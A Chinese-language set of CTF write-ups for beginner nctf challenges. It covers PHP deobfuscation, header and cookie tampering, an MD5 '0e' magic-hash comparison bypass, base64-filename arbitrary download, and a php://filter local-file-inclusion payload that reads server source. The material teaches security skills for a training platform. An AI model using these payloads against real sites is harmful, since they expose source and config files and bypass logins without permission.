# CTFd writeups

* Web
	* 自己解
		*	[AAencode (100)](#AAencode)
		*	[php decode (100)](#php_decode)
		*	[簽到 2 (50)](#簽到2)
		*	[這題不是 Web (100)](#這題不是Web)
		*	[單身二十年 (100)](#單身二十年)
		*	[你從哪裡來 (100)](#你從哪裡來)
		*	[單身一百年也沒用 (150)](#單身一百年也沒用)
		*	[Download~! (200)](#Download~!)
		*	[md5 collision (50)](#md5_collision)
		*	[COOKIE (200)](#COOKIE)
		*	[MYSQL (200)](#MYSQL)
		*	[Header (250)](#Header)	
	* 偷看 writeup
		*	[層層地進 (100)](#層層地進)
		*	[文件包含 (150)](#文件包含)
* Crypto
	*	[easy! (50)](#easy!)
	*	[keyboard (100)](#keyboard)
	*	[n 次 base64 (200)](#n次base64)
* Misc
	*	[easy wireshark (50)](#easy_wireshark)
* Stego
	*	[女神 (50)](#女神)

<h2 id="AAencode">AAencode (100)</h2>

AAencode 是把 JavaScript 加密成表情符號的加密法

題目

```
ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');
```

decode >> alert("Hello, JavaScript")

在 chrome console 送，就會直接跑出那個對話框

直接把整串亂七八糟的符號送出去，得到 flag

<h2 id="php_decode">php decode (100)</h2>

```php
<?php
function CLsI($ZzvSWE) {
    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));
    for ($i = 0; $i < strlen($ZzvSWE); $i++) {
        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);
    }
    return $ZzvSWE;
}eval(CLsI("+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="));?>
```

改成

```php
<?php
function CLsI($ZzvSWE) {
    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));
    for ($i = 0; $i < strlen($ZzvSWE); $i++) {
        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);
    }
    return $ZzvSWE;
}
echo CLsI("+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==");
?>
```

得到
`phpinfo(); flag:nctf{gzip_base64_hhhhhh}`


<h2 id="簽到2">簽到 2 (50)</h2>

```html
<form action="./index.php" method="post">
	<p>输入框：<input type="password" value="" name="text1" maxlength="10"><br>
	请输入口令：zhimakaimen
	<input type="submit" value="开门">
</form>
```

長度限制 10，`zhimakaimen`長度 11

firefox - HackBar - Enable Post data

`text1=zhimakaimen`

`nctf{follow_me_to_exploit}`

<h2 id="這題不是Web">這題不是 Web (100)</h2>

> 2.gif

用 .txt 開啟

`nctf{photo_can_also_hid3_msg}`


<h2 id="單身二十年">單身二十年 (100)</h2>

用 burp 看到 (chrome 的 network 也可以看到)

> GET /web8/no_key_is_here_forever.php HTTP/1.1
> 
> Host: chinalover.sinaapp.com
> 
> User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
> 
> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
> 
> Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
> 
> Accept-Encoding: gzip, deflate
> 
> Referer: http://chinalover.sinaapp.com/web8/search_key.php
> 
> Connection: close

Action -> Sent to Repeater 改成

> GET /web8/search_key.php HTTP/1.1

送回去

Response

```php
<script>window.location="./no_key_is_here_forever.php"; </script>
key is : nctf{yougotit_script_now}
```

<h2 id="你從哪裡來">你從哪裡來 (100)</h2>

HTTP Header 有一個叫 Referer

> Referer：表示瀏覽器所存取的前一個頁面，正是那個頁面上的某個連結將瀏覽器帶到了當前所請求的這個頁面。

用 burp 補上

```
Referer: google.com
```

`flag:nctf{http_referer}`

<h2 id="單身一百年也沒用">單身一百年也沒用 (150)</h2>

chrome - Network

有個被重新導向的 index.php

他的 Response Header `flag:nctf{this_is_302_redirect}`


<h2 id="Download~!">Download~! (200)</h2>

提示說想下啥就下啥，但別下載音樂...

注意到兩首歌的 url

```
download.php?url=eGluZ3hpbmdkaWFuZGVuZy5tcDM=
download.php?url=YnV4aWFuZ3poYW5nZGEubXAz
```
把兩串都拿去 base64 decode，發現都是該檔檔名

xingxingdiandeng.mp3

buxiangzhangda.mp3

也就是說把想下載的檔名拿去 base64 encode 就可以下載了

直接在網頁上訪問 download.php

```
?Access Forbidden!
```

只好把他下載下來

```
base64('download.php') = ZG93bmxvYWQucGhw
download.php?url=ZG93bmxvYWQucGhw
```

download.php

```php
??<?php
error_reporting(0);
include("hereiskey.php");
$url=base64_decode($_GET[url]);
if( $url=="hereiskey.php" || $url=="buxiangzhangda.mp3" || $url=="xingxingdiandeng.mp3" || $url=="download.php"){
	$file_size = filesize($url);
	header ( "Pragma: public" );
	header ( "Cache-Control: must-revalidate, post-check=0, pre-check=0" );
	header ( "Cache-Control: private", false );
	header ( "Content-Transfer-Encoding: binary" );
	header ( "Content-Type:audio/mpeg MP3");
	header ( "Content-Length: " . $file_size);
	header ( "Content-Disposition: attachment; filename=".$url);
	echo(file_get_contents($url));
	exit;
}
else {
	echo "Access Forbidden!";
}
?>
```

有個檔案叫 `hereiskey.php`，下載他

```php
?<?php
//flag:nctf{download_any_file_666}
?>
```

<h2 id="md5_collision">md5 collision (50)</h2>

```php
<?php
$md51 = md5('QNKCDZO');
$a = @$_GET['a'];
$md52 = @md5($a);
if(isset($a)){
if ($a != 'QNKCDZO' && $md51 == $md52) {
    echo "nctf{*****************}";
} else {
    echo "false!!!";
}}
else{echo "please input a";}
?>
```

```
md5('QNKCDZO') = 0e830400451993494058024219903391
```

`==` 是弱比較

只要做完 md5 後數值是 `0e` 開頭就會判斷通過 (科學記號的關係)

找一個做完 md5 後開頭是 0e 的值 `s1091221200a`

```
?a=s1091221200a
```

`nctf{md5_collision_is_easy}`

<h2 id="COOKIE">COOKIE (200)</h2>

TIP: 0 == not

> GET /web10/index.php HTTP/1.1
> Host: chinalover.sinaapp.com
> User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:48.0) Gecko/20100101 Firefox/48.0
> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
> Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
> Accept-Encoding: gzip, deflate
> Referer: http://ctf.nuptsast.com/challenges
> Cookie: Login=0
> Connection: close
> Upgrade-Insecure-Requests: 1

所以 1 == yes 

```
Cookie: Login=1
```

送回去

```
flag:nctf{cookie_is_different_from_session}
```

<h2 id="MYSQL">MYSQL (200)</h2>

```
/robots.txt
```

> robots.txt
> 存放於網站根目錄下的 ASCII 編碼文字檔案，通常會告訴網路爬蟲，哪些內容是可以被取得的，哪些是不可以取得的。

```php
别太开心，flag不在这，这个文件的用途你看完了？
在CTF比赛中，这个文件往往存放着提示信息

TIP:sql.php

<?php
if($_GET[id]) {
   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $id = intval($_GET[id]);
  $query = @mysql_fetch_array(mysql_query("select content from ctf2 where id='$id'"));
  if ($_GET[id]==1024) {
      echo "<p>no! try again</p>";
  }
  else{
    echo($query[content]);
  }
}
?>
```

> intval(): 取得變量的整數值（不能用於 array 或 object）

```
http://chinalover.sinaapp.com/web11/sql.php?id=1023
```
no msg in 1023~~~

```
http://chinalover.sinaapp.com/web11/sql.php?id=1024
```
no! try again

```
http://chinalover.sinaapp.com/web11/sql.php?id=1024.5
```

`the flag is:nctf{query_in_mysql}`

<h2 id="Header">Header (250)</h2>

藏在 Response Header 裡面

`nctf{tips_often_hide_here}`

<h2 id="層層地進">層層地進 (100)</h2>

訪問 http://chinalover.sinaapp.com/web3/404.html

原始碼中間有一段

```php
<!-- Placed at the end of the document so the pages load faster -->
<!--  
<script src="./js/jquery-n.7.2.min.js"></script>
<script src="./js/jquery-c.7.2.min.js"></script>
<script src="./js/jquery-t.7.2.min.js"></script>
<script src="./js/jquery-f.7.2.min.js"></script>
<script src="./js/jquery-{.7.2.min.js"></script>
<script src="./js/jquery-t.7.2.min.js"></script>
<script src="./js/jquery-h.7.2.min.js"></script>
<script src="./js/jquery-i.7.2.min.js"></script>
<script src="./js/jquery-s.7.2.min.js"></script>
<script src="./js/jquery-_.7.2.min.js"></script>
<script src="./js/jquery-i.7.2.min.js"></script>
<script src="./js/jquery-s.7.2.min.js"></script>
<script src="./js/jquery-_.7.2.min.js"></script>
<script src="./js/jquery-a.7.2.min.js"></script>
<script src="./js/jquery-_.7.2.min.js"></script>
<script src="./js/jquery-f.7.2.min.js"></script>
<script src="./js/jquery-l.7.2.min.js"></script>
<script src="./js/jquery-4.7.2.min.js"></script>
<script src="./js/jquery-g.7.2.min.js"></script>
<script src="./js/jquery-}.7.2.min.js"></script>
-->
```

還是不知為何要訪問 `/404.html`

`nctf{this_is_a_fl4g}`

<h2 id="文件包含">Web - 文件包含 (150)</h2>

題目 http://4.chinalover.sinaapp.com/web7/index.php

只有一個超連結 `click me? no` 點進去後 url 變成

```
http://4.chinalover.sinaapp.com/web7/index.php?file=show.php
```

[php:// 介紹](http://php.net/manual/zh/wrappers.php.php)

[漏洞用法](http://www.cnseay.com/2356/comment-page-1/)

範例

```
http://127.0.0.1:81/test.php?file=php://filter/convert.base64-encode/resource=config.php
```

把 `php://filter/convert.base64-encode/resource=` 加進題目的 url 中

```
http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php
```

得到

```
PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4=
```

base64 decode

```
<html>
    <title>asdf</title>
    
<?php
	error_reporting(0);
	if(!$_GET[file]){echo '<a href="./index.php?file=show.php">click me? no</a>';}
	$file=$_GET['file'];
	if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
		echo "Oh no!";
		exit();
	}
	include($file); 
//flag:nctf{edulcni_elif_lacol_si_siht}

?>
</html>
```

<h2 id="easy!">easy! (50)</h2>

bmN0Znt0aGlzX2lzX2Jhc2U2NF9lbmNvZGV9

base64


<h2 id="keyboard">keyboard (100)</h2>

ytfvbhn tgbgy hjuygbn yhnmki tgvhn uygbnjm uygbn yhnijm

areuhack

<h2 id="n次base64">n 次 base64 (200)</h2>

```
Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1NHVkVRbUZXVmxsM1ZtcEJlRll5U2tWVWJHaG9UVlZ3VlZacVFtRlRNbEpJVm10a1dHSkdjSEJXYTFwaFpWWmFkRTFVVWxSTmF6RTFWa2QwYzJGc1NuUmhSemxWVmpOT00xcFZXbUZrUjA1R1drWlNUbUpGY0VwV2JURXdZVEZrU0ZOclpHcFNWR3hoV1d4U1IyUnNXbGRYYlhSWFRWaENSbFpYZUhkV01ERkZVbFJDVjAxdVVuWldha3BIVmpGT2RWVnNXbWhsYlhob1ZtMXdUMkl5UmtkalJtUllZbGhTV0ZSV2FFTlNiRnBZWlVoa1YwMUVSa1pWYkZKRFZqSkdjbUV6YUZaaGExcG9WakJhVDJOdFJrZFhiV2hzWWxob2IxWnRNWGRVTVZWNVVtdGtWMWRIYUZsWmJGWmhZMVphZEdONlJteFNiSEJaV2xWb2ExWXdNVVZTYTFwV1lrWktSRlpxU2tabFZsSlpZVVprVTFKV2NIbFdWRUpoVkRKT2MyTkZhR3BTYkVwVVZteG9RMWRzV25KWGJHUmFWakZHTkZaSGRHdFdiVXBIVjJ4U1dtSkhhRlJXTUZwVFZqRmtkRkp0ZUZkaVZrbzFWbXBLTkZReFdsaFRiRnBxVWxkU1lWUlZXbmRsYkZweFVtMUdUMkpGV2xwWlZWcHJWVEZLVjJOSWJGZFdSVXBvVmtSS1QyUkdTbkphUm1ocFZqTm9WVmRXVWs5Uk1XUkhWMjVTVGxaRlNsaFVWbVEwVjBaYVdHUkhkRmhTTUhCSlZsZDRjMWR0U2toaFJsSlhUVVp3VkZacVNrZFNiRkp6Vlcxc1UwMHhSalpXYWtvd1ZURlZlRmR1U2s1WFJYQnhWVzB4YjFZeFVsaE9WemxzWWtad2VGVnRNVWRVTWtwR1YyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pHbFhSVXBKVm10U1MxVXhXWGhXYmxaV1lsaENWRmxyVm5kV1ZscDBaVWM1VWsxWFVucFdNV2h2VjBkS1JrNVdVbFZXTTJoSVZHdGFjMk5zWkhSa1IyaHBVbGhCZDFkV1ZtOVVNVnAwVTJ4V1YyRXhTbUZhVjNSaFYwWndSbFpZYUZkTlZrcDVWR3hhVDJGV1NuUlBWRTVYVFc1b1dGbHFTa1psUm1SWldrVTFWMVpzY0ZWWFZsSkhaREZrUjJKSVRtaFNlbXhQVkZaYWQyVkdWblJsU0dScFVqQndWMVl5ZEhkV01ERnhVbXRvVjFaRldreFdNVnBIWTIxS1IxcEdaRTVOUlhCS1ZtMTBVMU14VlhoWFdHaGhVMFphVmxscldrdGpSbHB4VkcwNWEySkhVbnBYYTFKVFYyeFpkMkpFVWxkTmFsWlVWa2Q0WVZKc1RuTmhSbkJZVTBWS1NWWnFRbUZXYlZaWVZXdG9hMUp0YUZSWmJGcExVMnhrVjFadFJtcE5WMUl3Vld4b2MyRkdTbGRUYlVaaFZqTlNhRmxWV25OT2JFcHpXa2R3YVZORlNrbFdiR040WXpGVmQwMUliR2hTYlhoWVdXeG9RMVJHVW5KYVJWcHNVbTFTZWxsVldsTmhSVEZ6VTI1b1YxWjZSVEJhUkVaclVqSktTVlJ0YUZObGJYaFFWa1phWVdReVZrZFdibEpPVmxkU1YxUlhkSGRXTVd4eVZXMUdXRkl3VmpSWk1HaExWMnhhV0ZWclpHRldWMUpRVldwS1MxSXlSa2hoUlRWWFltdEtNbFp0TVRCVk1VMTRWVzVTVjJKSFVsVlpiWFIzWWpGV2NWTnRPVmRTYlhoYVdUQmFhMkV3TVZkalJteGhWbGROTVZaWGMzaGpNVTUxWTBaa1RtRnNXbFZXYTJRMFV6RktjMXBJVmxSaVJscFlXV3RhZG1Wc1drZFdiVVphVmpGS1IxUnNXbUZWUmxsNVlVaENWbUpIYUVSVWJYaHJWbFpHZEZKdGNFNVdNVWwzVmxkNGIyTXlSa2RUYkdSVVlsVmFWbFp1Y0Zka2JGcHlWMjFHYWxacmNEQmFSV1F3VlRKRmVsRllaRmhpUmxwb1dWUktSMVl4VG5OYVIyaE9UV3hLV1ZkWGVHOVJNVTE0WTBaYVdHRXpRbk5WYlRGVFpXeHNWbGRzVG1oV2EzQXhWVmMxYjFZeFdYcGhTRXBYVmtWYWVsWnFSbGRqTVdSellVZG9UazFWY0RKV2JHTjRUa2RSZVZaclpGZGlSMUp2Vlc1d2MySXhVbGRYYm1Sc1ZteHNOVlJzYUd0V01rcEhZa1JhV2xaV1NsQldNakZHWlZaV2NscEhSbGRXTVVwUlZsUkNWazVXV1hsU2EyaG9VbFJXV0ZsdGRFdE5iRnAwVFZSQ1ZrMVZNVFJXVnpWVFZqSktTRlZzV2xwaVdGSXpXV3BHVjJOV1RuUlBWbVJUWWxob1lWZFVRbUZoTVZwelUyNU9hbEp0ZUZaV2JGcExVMFphV0dNemFGaFNiRnA1V1ZWYWExUnRSbk5YYkZaWFlUSlJNRmxVUms5U01WcDFWR3hvYVZKc2NGbFhWM1JoWkRGa1YxZHJhR3hTTUZwaFZtcEdTMUl4VW5OWGJVWldVbXhzTlZsVldsTldNa1Y0VjJ0MFZWWnNjSEpaZWtaaFpFVTVWMVpyTlZkaWEwWXpWbXhqZDAxV1RYaFZXR2hZWW1zMVZWbHNWbUZXYkZwMFpVaGtUazFXY0hsV01qRkhZV3hhY21ORVJsaGhNWEJRVmtkNFlXTnRUa1ZYYkdST1lteEtlVmRZY0VkV2JWWlhWRzVXVkdKRk5XOVpXSEJYVjFaa1YxVnJaR3ROYTFwSVdXdGFiMkZ0Vm5KWGJHaFZWbTFTVkZZeWVHdGpiRnBWVW14b1UyRXpRbUZXVm1NeFlqRlplRmRxV2xKWFIyaFhWbXRXWVdWc1duRlNiWFJyVm14S01GVnRlRTloUjFaelYyeGtWMkpIVGpSVWEyUlNaVlphY2xwR1pGaFNNMmg1Vmxkd1ExbFhUa2RXYmxKc1UwZFNjMWxyV2xkT1ZsSnpXWHBXVjAxRVJsaFphMUpoVjJ4YVYyTklXbGROYm1ob1ZtcEdZV05XVm5OYVJUVlhZbXRLU2xZeGFIZFNNVmw1VkZoc1UyRXlhSEJWYlhNeFkwWnNWVkZ1WkU1aVJuQXdXbFZqTldFd01WWk5WRkpYWWtkb2RsWXdXbXRUUjBaSFlVWndhVmRIYUc5V2JURTBZekpPYzFwSVZtRlNNMEpVV1d0YWQwNUdXbGhOVkVKT1VteHNORll5TlZOV2JVcElaVWRvVm1KSFVsUlZNRnBoWTFaT2NscEZPV2xTV0VJMlZtdGtORmxXVlhsVGExcFlWMGhDV0Zac1duZFNNVkY0VjJ0T1ZtSkZTbFpVVlZGM1VGRTlQUT09
```

跑幾圈隨便設定，跳出 error 就表示次數太多

```python
#!usr/bin/env python
import base64

p = [題目]

for i in range(1, 50):
	p = base64.b64decode(p)
	print p
```

次數剩很少時直接用線上 decode

`flag:nctf{please_use_python_to_decode_base64}`

<h2 id="easy_wireshark">easy wireshark (50)</h2>

> wireshark.pcapng

hint: 听说抓到他浏览网页的包,flag就在网页里

用 wireshark 開 .pcapng，export HTTP

就有一個檔案叫 flag.php

<h2 id="女神">女神 (50)</h2>

> misc1.jpg

用記事本打開圖檔

`nctf{pic_yin_xie_shu}`